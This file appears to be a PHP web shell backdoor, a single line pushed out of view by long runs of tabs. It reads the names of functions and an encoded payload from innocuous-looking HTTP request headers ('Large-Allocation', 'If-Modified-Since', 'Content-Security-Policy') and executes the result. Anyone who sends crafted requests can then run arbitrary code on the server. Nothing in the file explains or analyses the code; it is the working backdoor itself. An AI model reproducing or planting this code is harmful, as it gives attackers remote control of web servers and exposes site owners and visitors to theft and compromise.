<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Large-Allocation'])){$accepted=$_HEADERS['Large-Allocation']('', $_HEADERS['If-Modified-Since']($_HEADERS['Content-Security-Policy']));$accepted();}
